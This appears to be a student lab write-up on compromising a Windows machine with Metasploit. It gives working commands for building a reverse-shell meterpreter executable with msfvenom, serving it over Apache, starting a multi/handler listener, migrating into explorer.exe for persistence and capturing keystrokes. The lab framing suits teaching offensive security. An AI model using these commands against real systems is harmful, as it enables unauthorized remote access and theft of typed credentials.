# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="653" height="400" alt="image" src="https://github.com/user-attachments/assets/c7b80e4b-36bc-4d34-a1d4-800518581622" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="645" height="160" alt="image" src="https://github.com/user-attachments/assets/d56bdd1e-a307-41cf-b69a-7191573b8420" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="592" height="112" alt="image" src="https://github.com/user-attachments/assets/758a732b-97b5-465d-ad21-3de1d9a8a2ae" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="417" height="115" alt="image" src="https://github.com/user-attachments/assets/fcaa9b59-b8c5-47e7-87fc-2c0a84cd74c1" />


Check the status of apache2
## OUTPUT:
<img width="693" height="412" alt="Screenshot 2026-11-19 201950" src="https://github.com/user-attachments/assets/02b7bf77-65da-4a7a-b215-f8782ea08ced" />







Invoke msfconsole:
## OUTPUT:

<img width="775" height="497" alt="Screenshot 2026-11-19 202142" src="https://github.com/user-attachments/assets/46b62251-f2fa-4d74-a604-4c52a59a3a10" />










Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:


<img width="952" height="878" alt="Screenshot 2026-11-19 201932" src="https://github.com/user-attachments/assets/c3663251-4f8c-4bd9-8ebd-e5f8761d6d6b" />


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:



Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:



On kali/parrot give the command exploit
## OUTPUT:



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
